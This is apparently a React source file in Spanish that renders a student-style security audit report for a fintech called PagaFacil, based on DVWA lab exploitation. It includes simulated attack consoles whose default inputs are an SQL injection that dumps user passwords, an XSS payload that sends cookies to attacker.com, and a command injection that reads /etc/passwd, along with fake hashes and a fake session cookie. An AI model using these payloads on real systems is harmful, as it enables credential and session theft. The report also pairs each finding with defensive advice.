import React, { useState, useEffect } from 'react';

// Inyección de estilos CSS personalizados con las variables de la paleta solicitada y animaciones avanzadas
const themeStyles = `
  :root {
    --color-bg: #CAA8F5;          /* Fondo principal en modo claro */
    --color-card: #9984D4;        /* Superficies de tarjeta */
    --color-text-main: #230C33;   /* Texto principal con máximo contraste */
    --color-text-muted: #592E83;  /* Texto secundario y descripciones */
    --color-primary: #5BE4F7;     /* Acción primaria y acentos */
    --color-secondary: #9984D4;   /* Bordes y acentos secundarios */
    --color-accent: #5BE4F7;      /* Resaltados */
    --color-border: #592E83;
  }
  .dark {
    --color-bg: #230C33;          /* Fondo principal en modo oscuro */
    --color-card: #592E83;        /* Superficies de tarjeta */
    --color-text-main: #CAA8F5;   /* Texto principal legible siempre */
    --color-text-muted: #5BE4F7;  /* Texto secundario legible siempre */
    --color-primary: #5BE4F7;     /* Acción primaria y acentos */
    --color-secondary: #9984D4;   /* Bordes y acentos secundarios */
    --color-accent: #9984D4;      
    --color-border: #5BE4F7;
  }

  .custom-bg { background-color: var(--color-bg); transition: background-color 0.5s ease, color 0.3s ease; }
  .custom-card { 
    background-color: var(--color-card); 
    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); 
  }
  .custom-card:hover {
    transform: translateY(-4px);
    box-shadow: 0 12px 24px -10px rgba(91, 228, 247, 0.25);
  }
  .custom-text { color: var(--color-text-main); }
  .custom-text-muted { color: var(--color-text-muted); }
  .custom-primary-bg { background-color: var(--color-primary); }
  .custom-primary-text { color: var(--color-primary); }
  .custom-border { border-color: var(--color-border); }
  
  .custom-hover:hover { 
    background-color: rgba(134, 97, 193, 0.15); 
    transform: scale(1.02);
  }

  @keyframes progress-loading {
    0% { transform: translateX(-100%); }
    100% { transform: translateX(100%); }
  }
  .animate-progress {
    animation: progress-loading 1.5s infinite linear;
  }

  .text-\[\#8661C1\], .dark .dark\:text-\[\#8661C1\] { color: var(--color-primary) !important; }
  .text-\[\#BE97C6\], .dark .dark\:text-\[\#BE97C6\] { color: var(--color-secondary) !important; }
  .text-\[\#98d9f7\], .dark .dark\:text-\[\#98d9f7\] { color: var(--color-accent) !important; }
  .text-\[\#2E294E\], .dark .dark\:text-\[\#2E294E\] { color: var(--color-text-main) !important; }
  .text-\[\#1F2433\], .dark .dark\:text-\[\#1F2433\] { color: var(--color-text-main) !important; }
  .text-\[\#5F687A\], .dark .dark\:text-\[\#5F687A\] { color: var(--color-text-muted) !important; }
  .text-\[\#4B5267\], .dark .dark\:text-\[\#4B5267\] { color: var(--color-text-muted) !important; }
  .bg-\[\#8661C1\], .dark .dark\:bg-\[\#8661C1\] { background-color: var(--color-primary) !important; }
  .bg-\[\#BE97C6\], .dark .dark\:bg-\[\#BE97C6\] { background-color: var(--color-secondary) !important; }
  .bg-\[\#98d9f7\], .dark .dark\:bg-\[\#98d9f7\] { background-color: var(--color-accent) !important; }
  .bg-\[\#2E294E\], .dark .dark\:bg-\[\#2E294E\] { background-color: var(--color-bg) !important; }
  .bg-\[\#1D1A33\], .dark .dark\:bg-\[\#1D1A33\] { background-color: var(--color-bg) !important; }
  .border-\[\#8661C1\], .dark .dark\:border-\[\#8661C1\] { border-color: var(--color-primary) !important; }
  .border-\[\#BE97C6\], .dark .dark\:border-\[\#BE97C6\] { border-color: var(--color-secondary) !important; }
  .border-\[\#98d9f7\], .dark .dark\:border-\[\#98d9f7\] { border-color: var(--color-accent) !important; }
  .border-\[\#2E294E\], .dark .dark\:border-\[\#2E294E\] { border-color: var(--color-border) !important; }
`;

const evidenceImages = {
  sqli: new URL('../docs_lopeli/img_lopeli/sqli_lopeli.png', import.meta.url).href,
  xss: new URL('../docs_lopeli/img_lopeli/xss_lopeli.png', import.meta.url).href,
  comandos: new URL('../docs_lopeli/img_lopeli/comandos_lopeli.png', import.meta.url).href,
};

// Componente para indicar dónde van las capturas de pantalla de la auditoría con botón de copiado interactivo
const ImagePlaceholder = ({ title, imageSrc }) => {
  return (
    <div className="my-6 border-2 border-dashed custom-border rounded-xl p-4 sm:p-6 bg-black/10 dark:bg-white/10 flex flex-col items-center justify-center text-center transition-all duration-300 hover:border-[#5BE4F7] hover:bg-black/15 dark:hover:bg-white/15 group relative overflow-hidden">
      <svg className="w-12 h-12 custom-text-muted mb-2 opacity-80 transition-transform duration-300 group-hover:scale-110 group-hover:rotate-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" />
      </svg>
      <p className="text-sm font-bold custom-text transition-colors duration-250">{title}</p>
      {imageSrc && (
        <div className="mt-4 w-full overflow-hidden rounded-xl border custom-border bg-[#CAA8F5]/20 dark:bg-[#592E83]/20 shadow-sm">
          <img src={imageSrc} alt={title} className="block w-full h-auto object-contain bg-[#CAA8F5]/20 dark:bg-[#230C33]" />
        </div>
      )}
    </div>
  );
};

// Simulador interactivo de Consola para Explotación en tiempo real
const ExploitTerminal = ({ type, defaultPayload }) => {
  const [payload, setPayload] = useState(defaultPayload);
  const [output, setOutput] = useState([]);
  const [status, setStatus] = useState('idle'); // idle, running, success

  const executeExploit = () => {
    setStatus('running');
    setOutput(['[+] Estableciendo conexión con el servidor objetivo de PagaFacil...', '[+] Enviando cabeceras HTTP alteradas...', '[+] Inyectando payload en el buffer vulnerable...']);
    
    setTimeout(() => {
      setOutput(prev => [...prev, '[+] Analizando respuesta del sistema...']);
    }, 1000);

    setTimeout(() => {
      if (type === 'sqli') {
        setOutput(prev => [
          ...prev,
          '⚠️ [ALERTA DE SEGURIDAD] INYECCIÓN COMPLETADA CON ÉXITO',
          '[EXFILTRACIÓN] Leyendo esquema de tablas relacionales:',
          '----------------------------------------',
          '• admin : 5f4dcc3b5aa765d61d8327deb882cf99',
          '• pagafacil_db_root : f107dbbc29806371f498967cf8',
          '• wallet_test_user : 8d969eef6ecad3c29a3a629280e',
          '----------------------------------------',
          '[+] Sesión de base de datos cerrada de forma anónima.'
        ]);
      } else if (type === 'xss') {
        setOutput(prev => [
          ...prev,
          '⚠️ [ALERTA DE SEGURIDAD] XSS PERSISTENTE EJECUTADO EN EL DOM',
          '[!] Script inyectado esperando triggers de sesión activa.',
          '[+] Capturando cookie de sesión del administrador:',
          '----------------------------------------',
          'Cookie: _session_id=PagaFacil_Admin_90a8cb11b19ffbc; HttpOnly=false; Secure=true;',
          '----------------------------------------',
          '[+] Exfiltrando sesión hacia servidor del atacante...'
        ]);
      } else {
        setOutput(prev => [
          ...prev,
          '⚠️ [CRÍTICO] INYECCIÓN DE COMANDOS COMPLETADA - SHELL ACTIVA',
          '[+] Invocando shell remota del sistema operativo:',
          '----------------------------------------',
          'root:x:0:0:root:/root:/bin/bash',
          'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
          'pagafacil_runner:x:1001:1001:PagaFacil Service:/bin/bash',
          '----------------------------------------',
          '[+] RCE finalizado sin detección perimetral.'
        ]);
      }
      setStatus('success');
    }, 2400);
  };

  return (
    <div className="bg-slate-950 rounded-xl p-5 border border-slate-800 my-6 shadow-2xl relative overflow-hidden font-mono text-xs text-slate-350">
      <div className="flex items-center justify-between border-b border-slate-800 pb-3 mb-3 text-slate-500">
        <div className="flex items-center gap-1.5">
          <span className="w-2.5 h-2.5 rounded-full bg-red-500"></span>
          <span className="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
          <span className="w-2.5 h-2.5 rounded-full bg-green-500"></span>
          <span className="ml-2 text-[10px] font-bold tracking-wider text-slate-400">LABORATORIO DE SEGURIDAD - EXPERIMENTAL</span>
        </div>
        <span className={`text-[10px] px-2 py-0.5 rounded font-bold ${status === 'running' ? 'bg-amber-500/20 text-amber-400 animate-pulse' : status === 'success' ? 'bg-rose-500/20 text-rose-400' : 'bg-emerald-500/20 text-emerald-400'}`}>
          {status === 'running' ? 'EXPLOTANDO...' : status === 'success' ? 'COMPROMETIDO' : 'LISTO'}
        </span>
      </div>

      <div className="space-y-4">
        <div>
          <label className="block text-[10px] font-bold text-slate-400 mb-1">Payload a evaluar:</label>
          <div className="flex gap-2">
            <input 
              type="text" 
              value={payload} 
              onChange={(e) => setPayload(e.target.value)}
              className="flex-1 bg-black/50 border border-slate-800 rounded px-3 py-1.5 text-emerald-400 focus:outline-none focus:border-[#8661C1]"
              disabled={status === 'running'}
            />
            <button 
              onClick={executeExploit}
              disabled={status === 'running'}
              className="px-4 py-1.5 rounded bg-[#8661C1] hover:bg-[#BE97C6] text-white font-bold transition-all hover:scale-105 active:scale-95 disabled:opacity-50 cursor-pointer"
            >
              Simular Ataque
            </button>
          </div>
        </div>

        <div className="bg-black/80 rounded-lg p-3 min-h-[140px] text-slate-350 flex flex-col justify-between">
          <div>
            <span className="text-[10px] text-slate-500 block mb-1">SALIDA DEL SISTEMA:</span>
            {output.length === 0 ? (
              <p className="text-slate-650 italic text-[11px] mt-2">Haz clic en "Simular Ataque" para probar el exploit en tiempo real.</p>
            ) : (
              <div className="space-y-1 text-[11px] leading-relaxed">
                {output.map((line, i) => (
                  <p key={i} className={line.startsWith('⚠️') ? 'text-rose-400 font-extrabold' : line.startsWith('•') || line.startsWith('Cookie') ? 'text-emerald-400 font-semibold' : 'text-slate-350'}>
                    {line}
                  </p>
                ))}
              </div>
            )}
          </div>
          {status === 'running' && (
            <div className="w-full bg-slate-900 h-1 rounded-full overflow-hidden mt-3 relative">
              <div className="bg-gradient-to-r from-[#8661C1] to-[#98d9f7] h-full absolute top-0 left-0 animate-progress w-2/3"></div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

// ICONOS SVG PERSONALIZADOS
const ShieldIcon = () => (
  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
  </svg>
);

const DatabaseIcon = () => (
  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4m0 5c0 2.21-3.582 4-8 4s-8-1.79-8-4" />
  </svg>
);

const CodeIcon = () => (
  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4" />
  </svg>
);

const TerminalIcon = () => (
  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
  </svg>
);

const FolderIcon = () => (
  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z" />
  </svg>
);

const GridIcon = () => (
  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM14 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2V6zM4 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2zM14 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2v-2z" />
  </svg>
);

const SettingsIcon = () => (
  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 6V4m0 2a2 2 0 100 4m0-4a2 2 0 110 4m-6 8a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4m6 6v10m6-2a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4" />
  </svg>
);

const RefreshIcon = () => (
  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 1121.21 7.89M9 11l3-3 3 3m-3-3v12" />
  </svg>
);

const SparklesIcon = () => (
  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 3v4M3 5h4M6 17v4m-2-2h4m5-16l2.286 6.857L21 12l-5.714 2.143L13 21l-2.286-6.857L5 12l5.714-2.143L13 3z" />
  </svg>
);

// Calculadora interactiva de CVSS v3.1 adaptada estéticamente
const CVSSCalculator = ({ initialScore }) => {
  const [av, setAv] = useState('N');
  const [ac, setAc] = useState('L');
  const [pr, setPr] = useState('N');
  const [ui, setUi] = useState('N');
  const [s, setS] = useState('U');
  const [c, setC] = useState('H');
  const [i, setI] = useState('H');
  const [a, setA] = useState('H');

  const calculate = () => {
    let score = 0;
    let baseConf = c === 'H' ? 0.56 : c === 'L' ? 0.22 : 0;
    let baseInteg = i === 'H' ? 0.56 : i === 'L' ? 0.22 : 0;
    let baseAvail = a === 'H' ? 0.56 : a === 'L' ? 0.22 : 0;
    
    let exploitability = 8.22 * (av === 'N' ? 0.85 : av === 'A' ? 0.62 : av === 'L' ? 0.55 : 0.2) * (ac === 'L' ? 0.77 : 0.44) * (pr === 'N' ? 0.85 : pr === 'L' ? 0.62 : 0.27) * (ui === 'N' ? 0.85 : 0.62);
    let iss = 1 - (1 - baseConf) * (1 - baseInteg) * (1 - baseAvail);
    let impact = s === 'U' ? 6.42 * iss : 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15);
    
    if (impact <= 0) {
      score = 0;
    } else {
      if (s === 'U') {
        score = Math.min(Math.ceil((impact + exploitability) * 10) / 10, 10);
      } else {
        score = Math.min(Math.ceil(1.08 * (impact + exploitability) * 10) / 10, 10);
      }
    }
    return score.toFixed(1);
  };

  const score = calculate();

  return (
    <div className="bg-black/10 dark:bg-black/30 p-5 rounded-2xl border custom-border my-6 text-xs transition-all hover:shadow-lg">
      <div className="flex justify-between items-center mb-4 border-b border-[#BE97C6]/30 pb-2">
        <h4 className="font-bold uppercase tracking-wider custom-text">Calculadora CVSS v3.1 interactiva</h4>
        <div className="px-3 py-1.5 rounded-full text-xs font-black bg-[#8661C1] text-white animate-pulse">
          Severidad: {score}
        </div>
      </div>
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-3">
        <div>
          <label className="block font-semibold mb-1 custom-text">Vector (AV)</label>
          <select value={av} onChange={(e) => setAv(e.target.value)} className="w-full bg-white dark:bg-[#2E294E] border custom-border p-1.5 rounded custom-text transition-colors focus:border-[#8661C1] focus:outline-none">
            <option value="N">Network</option>
            <option value="A">Adjacent</option>
            <option value="L">Local</option>
            <option value="P">Physical</option>
          </select>
        </div>
        <div>
          <label className="block font-semibold mb-1 custom-text">Complejidad (AC)</label>
          <select value={ac} onChange={(e) => setAc(e.target.value)} className="w-full bg-white dark:bg-[#2E294E] border custom-border p-1.5 rounded custom-text transition-colors focus:border-[#8661C1] focus:outline-none">
            <option value="L">Low</option>
            <option value="H">High</option>
          </select>
        </div>
        <div>
          <label className="block font-semibold mb-1 custom-text">Privilegios (PR)</label>
          <select value={pr} onChange={(e) => setPr(e.target.value)} className="w-full bg-white dark:bg-[#2E294E] border custom-border p-1.5 rounded custom-text transition-colors focus:border-[#8661C1] focus:outline-none">
            <option value="N">None</option>
            <option value="L">Low</option>
            <option value="H">High</option>
          </select>
        </div>
        <div>
          <label className="block font-semibold mb-1 custom-text">Interacción (UI)</label>
          <select value={ui} onChange={(e) => setUi(e.target.value)} className="w-full bg-white dark:bg-[#2E294E] border custom-border p-1.5 rounded custom-text transition-colors focus:border-[#8661C1] focus:outline-none">
            <option value="N">None</option>
            <option value="R">Required</option>
          </select>
        </div>
      </div>
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
        <div>
          <label className="block font-semibold mb-1 custom-text">Alcance (Scope)</label>
          <select value={s} onChange={(e) => setS(e.target.value)} className="w-full bg-white dark:bg-[#2E294E] border custom-border p-1.5 rounded custom-text transition-colors focus:border-[#8661C1] focus:outline-none">
            <option value="U">Unchanged</option>
            <option value="C">Changed</option>
          </select>
        </div>
        <div>
          <label className="block font-semibold mb-1 custom-text">Confidencialidad</label>
          <select value={c} onChange={(e) => setC(e.target.value)} className="w-full bg-white dark:bg-[#2E294E] border custom-border p-1.5 rounded custom-text transition-colors focus:border-[#8661C1] focus:outline-none">
            <option value="H">High</option>
            <option value="L">Low</option>
            <option value="N">None</option>
          </select>
        </div>
        <div>
          <label className="block font-semibold mb-1 custom-text">Integridad</label>
          <select value={i} onChange={(e) => setI(e.target.value)} className="w-full bg-white dark:bg-[#2E294E] border custom-border p-1.5 rounded custom-text transition-colors focus:border-[#8661C1] focus:outline-none">
            <option value="H">High</option>
            <option value="L">Low</option>
            <option value="N">None</option>
          </select>
        </div>
        <div>
          <label className="block font-semibold mb-1 custom-text">Disponibilidad</label>
          <select value={a} onChange={(e) => setA(e.target.value)} className="w-full bg-white dark:bg-[#2E294E] border custom-border p-1.5 rounded custom-text transition-colors focus:border-[#8661C1] focus:outline-none">
            <option value="H">High</option>
            <option value="L">Low</option>
            <option value="N">None</option>
          </select>
        </div>
      </div>
    </div>
  );
};


// 01_RESUMEN_LOPELI.MD
const Resumen = () => (
  <div className="space-y-6">
    <div className="flex flex-col md:flex-row md:items-center justify-between border-b pb-4 custom-border">
      <div>
        <span className="text-xs font-semibold uppercase tracking-wider text-[#8661C1] dark:text-[#98d9f7]">Archivo: docs_lopeli/01_resumen_lopeli.md</span>
        <h1 className="text-3xl font-extrabold custom-text mt-1">Resumen Ejecutivo: PagaFacil</h1>
      </div>
      <span className="mt-2 md:mt-0 inline-flex items-center px-4 py-1.5 rounded-full text-xs font-bold bg-[#98d9f7] text-[#2E294E] shadow-sm transform hover:scale-105 transition-transform duration-300">
        Fintech / Billetera Digital
      </span>
    </div>

    <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
      <div className="p-5 rounded-xl border border-[#BE97C6] bg-black/5 dark:bg-white/5 transition-all duration-300 hover:-translate-y-1 hover:bg-[#98d9f7]/10">
        <h3 className="font-bold text-[#8661C1] dark:text-[#98d9f7] text-base">📱 Billeteras</h3>
        <p className="text-xs custom-text-muted mt-1.5">Custodia y gestión de saldos móviles de nuestros usuarios.</p>
      </div>
      <div className="p-5 rounded-xl border border-[#BE97C6] bg-black/5 dark:bg-white/5 transition-all duration-300 hover:-translate-y-1 hover:bg-[#98d9f7]/10">
        <h3 className="font-bold text-[#8661C1] dark:text-[#98d9f7] text-base">💸 Transacciones</h3>
        <p className="text-xs custom-text-muted mt-1.5">Procesamiento inmediato e historial confidencial de transferencias.</p>
      </div>
      <div className="p-5 rounded-xl border border-[#BE97C6] bg-black/5 dark:bg-white/5 transition-all duration-300 hover:-translate-y-1 hover:bg-[#98d9f7]/10">
        <h3 className="font-bold text-[#8661C1] dark:text-[#98d9f7] text-base">🏦 Datos Bancarios</h3>
        <p className="text-xs custom-text-muted mt-1.5">Cuentas vinculadas e información crítica bajo PCI-DSS.</p>
      </div>
    </div>

    <div className="prose dark:prose-invert max-w-none custom-text space-y-4">
      <p>
        Este informe técnico detalla la auditoría de seguridad preventiva realizada para la plataforma <strong>PagaFacil</strong>. En el ecosistema Fintech, la ciberseguridad es el pilar de la confianza de negocio. Un hallazgo técnico en la capa web no es solo un fallo de código, representa un riesgo crítico de pérdida de capital y reputación.
      </p>
    </div>
  </div>
);

// 02_SQLI_LOPELI.MD
const SQLi = () => (
  <div className="space-y-6">
    <div className="border-b pb-4 custom-border">
      <span className="text-xs font-semibold uppercase tracking-wider text-[#8661C1] dark:text-[#98d9f7]">Archivo: docs_lopeli/02_sqli_lopeli.md</span>
      <h1 className="text-3xl font-extrabold custom-text mt-1">Inyección SQL (SQLi)</h1>
    </div>

    <div className="space-y-4 custom-text">
      <h3 className="text-lg font-bold">1. Evidencia de Explotación</h3>
      <p className="text-sm">
        Inyección de payloads en el campo de búsqueda del portal de clientes para extraer el esquema y datos de las tablas del sistema DVWA.
      </p>

      {/* UBICACIÓN DE LA IMAGEN EXPLICADA */}
      <ImagePlaceholder 
        title="Captura del ataque SQL Injection en DVWA" 
        imageSrc={evidenceImages.sqli}
      />

      <ExploitTerminal 
        type="sqli" 
        defaultPayload="%' UNION SELECT null, concat(user,0x3a,password) FROM users #" 
      />

      <h3 className="text-lg font-bold mt-4">2. CVSS v3.1</h3>
      <CVSSCalculator initialScore={9.8} />

      <h3 className="text-lg font-bold mt-4">3. Defensa Recomendada</h3>
      <p className="text-sm">
        Implementar parametrización de consultas de base de datos a nivel de backend para evitar la concatenación directa de inputs de usuario.
      </p>
    </div>
  </div>
);

// 03_XSS_LOPELI.MD
const XSS = () => (
  <div className="space-y-6">
    <div className="border-b pb-4 custom-border">
      <span className="text-xs font-semibold uppercase tracking-wider text-[#8661C1] dark:text-[#98d9f7]">Archivo: docs_lopeli/03_xss_lopeli.md</span>
      <h1 className="text-3xl font-extrabold custom-text mt-1">Cross-Site Scripting (XSS)</h1>
    </div>

    <div className="space-y-4 custom-text">
      <h3 className="text-lg font-bold">1. Evidencia de Explotación</h3>
      <p className="text-sm">
        Inyección de scripts maliciosos en campos persistentes para forzar el robo y exfiltración de la cookie de sesión del administrador.
      </p>

      {/* UBICACIÓN DE LA IMAGEN EXPLICADA */}
      <ImagePlaceholder 
        title="Captura de pantalla de XSS Stored en DVWA" 
        imageSrc={evidenceImages.xss}
      />

      <ExploitTerminal 
        type="xss" 
        defaultPayload="<script>fetch('https://attacker.com/log?c=' + document.cookie)</script>" 
      />

      <h3 className="text-lg font-bold mt-4">2. CVSS v3.1</h3>
      <CVSSCalculator initialScore={8.2} />

      <h3 className="text-lg font-bold mt-4">3. Defensa Recomendada</h3>
      <p className="text-sm">
        Aplicar escape contextual estricto, sanitización utilizando librerías validadas como DOMPurify, e implementar cabeceras Content Security Policy (CSP).
      </p>
    </div>
  </div>
);

// 04_COMANDOS_LOPELI.MD
const Comandos = () => (
  <div className="space-y-6">
    <div className="border-b pb-4 custom-border">
      <span className="text-xs font-semibold uppercase tracking-wider text-[#8661C1] dark:text-[#98d9f7]">Archivo: docs_lopeli/04_comandos_lopeli.md</span>
      <h1 className="text-3xl font-extrabold custom-text mt-1">Inyección de Comandos</h1>
    </div>

    <div className="space-y-4 custom-text">
      <h3 className="text-lg font-bold">1. Evidencia de Explotación</h3>
      <p className="text-sm">
        Abuso de utilidades de red en consola de DVWA para encadenar comandos de Linux y ejecutar scripts remotos no autorizados.
      </p>

      {/* UBICACIÓN DE LA IMAGEN EXPLICADA */}
      <ImagePlaceholder 
        title="Captura del comando inyectado ejecutando RCE" 
        imageSrc={evidenceImages.comandos}
      />

      <ExploitTerminal 
        type="comandos" 
        defaultPayload="8.8.8.8 && cat /etc/passwd" 
      />

      <h3 className="text-lg font-bold mt-4">2. CVSS v3.1</h3>
      <CVSSCalculator initialScore={9.8} />

      <h3 className="text-lg font-bold mt-4">3. Defensa Recomendada</h3>
      <p className="text-sm">
        Evitar la invocación directa del intérprete de shell de comandos, utilizando en su lugar APIs del entorno de ejecución con parámetros desestructurados.
      </p>
    </div>
  </div>
);

// 05_ACTIVOS_LOPELI.MD
const Activos = () => (
  <div className="space-y-6">
    <div className="border-b pb-4 custom-border">
      <span className="text-xs font-semibold uppercase tracking-wider text-[#8661C1] dark:text-[#98d9f7]">Archivo: docs_lopeli/05_activos_lopeli.md</span>
      <h1 className="text-3xl font-extrabold custom-text mt-1">Activos de Información</h1>
    </div>

    <div className="overflow-x-auto rounded-xl border custom-border">
      <table className="w-full text-sm text-left border-collapse">
        <thead>
          <tr className="bg-black/5 dark:bg-white/5 custom-text border-b custom-border">
            <th className="p-4 font-bold">Activo de Información</th>
            <th className="p-4 font-bold">Categoría de Datos</th>
            <th className="p-4 font-bold">Nivel de Criticidad</th>
          </tr>
        </thead>
        <tbody className="divide-y custom-border custom-text-muted">
          <tr className="hover:bg-black/5 dark:hover:bg-white/5 transition-colors duration-200">
            <td className="p-4 font-bold">Base de Datos de Billeteras</td>
            <td className="p-4">Financiero</td>
            <td className="p-4"><span className="px-3 py-1 rounded-full text-xs bg-red-500 text-white font-bold shadow-sm">Crítica</span></td>
          </tr>
          <tr className="hover:bg-black/5 dark:hover:bg-white/5 transition-colors duration-200">
            <td className="p-4 font-bold">Pasarela y Tokens Bancarios</td>
            <td className="p-4">PCI-DSS / Transaccional</td>
            <td className="p-4"><span className="px-3 py-1 rounded-full text-xs bg-red-500 text-white font-bold shadow-sm">Crítica</span></td>
          </tr>
          <tr className="hover:bg-black/5 dark:hover:bg-white/5 transition-colors duration-200">
            <td className="p-4 font-bold">Historial de Transacciones</td>
            <td className="p-4">Auditoría / Financiero</td>
            <td className="p-4"><span className="px-3 py-1 rounded-full text-xs bg-orange-500 text-white font-bold shadow-sm">Alta</span></td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>
);

// 06_MATRIZ_LOPELI.MD (Heatmap Interactivo)
const Matriz = () => {
  const [selected, setSelected] = useState(null);
  
  // Matriz 5x5 invertida para renderizado correcto del heatmap
  const heatmap = [
    [5, 10, 15, 20, 25],
    [4, 8, 12, 16, 20],
    [3, 6, 9, 12, 15],
    [2, 4, 6, 8, 10],
    [1, 2, 3, 4, 5],
  ];

  const getColor = (val) => {
    if (val >= 15) return 'bg-[#8661C1] text-white hover:opacity-90 shadow-[#8661C1]/30'; 
    if (val >= 8) return 'bg-[#BE97C6] text-white hover:opacity-90 shadow-[#BE97C6]/30'; 
    return 'bg-[#98d9f7] text-[#2E294E] hover:opacity-90 shadow-[#98d9f7]/30'; 
  };

  const getSeverityName = (val) => {
    if (val >= 15) return 'Severidad Crítica - Mitigación Inmediata';
    if (val >= 8) return 'Severidad Media/Alta - Atención Prioritaria';
    return 'Riesgo Controlado - Monitoreo Semestral';
  };

  return (
    <div className="space-y-6">
      <div className="border-b pb-4 custom-border">
        <span className="text-xs font-semibold uppercase tracking-wider text-[#8661C1] dark:text-[#98d9f7]">Archivo: docs_lopeli/06_matriz_lopeli.md</span>
        <h1 className="text-3xl font-extrabold custom-text mt-1">Matriz de Riesgo PagaFacil</h1>
      </div>
      <p className="text-sm custom-text leading-relaxed">
        Nuestra matriz interactiva evalúa el riesgo ponderando <strong>Probabilidad × Impacto</strong>. Haz clic en las celdas del mapa de calor para visualizar las categorías de riesgo técnico y la severidad recomendada de mitigación.
      </p>
      
      <div className="flex flex-col md:flex-row gap-8 items-center justify-center p-4">
        <div className="grid grid-cols-5 gap-2 border-2 custom-border p-4 rounded-xl bg-black/10 dark:bg-white/5 max-w-sm w-full shadow-inner">
          {heatmap.map((row, i) => row.map((val, j) => (
            <button 
              key={`${i}-${j}`} 
              onClick={() => setSelected(val)}
              className={`w-full aspect-square flex items-center justify-center cursor-pointer transition-all duration-300 rounded-lg shadow-md font-black text-sm transform hover:scale-110 active:scale-95 ${getColor(val)}`}
            >
              <span>{val}</span>
            </button>
          )))}
        </div>
        <div className="max-w-xs text-xs custom-text-muted bg-black/5 dark:bg-white/5 p-5 rounded-xl shadow border custom-border w-full transition-all duration-300 hover:shadow-lg">
          <h4 className="font-bold custom-text mb-3 uppercase tracking-wider border-b border-[#BE97C6]/30 pb-1.5">Glosario de Severidad</h4>
          <ul className="space-y-2.5">
            <li className="flex items-center"><span className="inline-block w-3.5 h-3.5 rounded bg-[#8661C1] mr-2 shadow-sm"></span> 15 - 25: Mitigación Inmediata</li>
            <li className="flex items-center"><span className="inline-block w-3.5 h-3.5 rounded bg-[#BE97C6] mr-2 shadow-sm"></span> 8 - 12: Atención Prioritaria</li>
            <li className="flex items-center"><span className="inline-block w-3.5 h-3.5 rounded bg-[#98d9f7] mr-2 shadow-sm"></span> 1 - 6: Riesgo Controlado</li>
          </ul>
          {selected && (
            <div className="mt-5 p-4 bg-[#8661C1]/10 rounded-lg border border-[#8661C1]/30 font-bold text-center animate-in fade-in zoom-in duration-300">
              <span className="text-[10px] block text-[#98d9f7] uppercase tracking-widest mb-1">VALOR SELECCIONADO</span>
              <span className="custom-primary-text font-black text-2xl">{selected}</span>
              <p className="text-[10px] custom-text mt-1 leading-normal font-semibold">{getSeverityName(selected)}</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

// 07_CONTROLES_LOPELI.MD
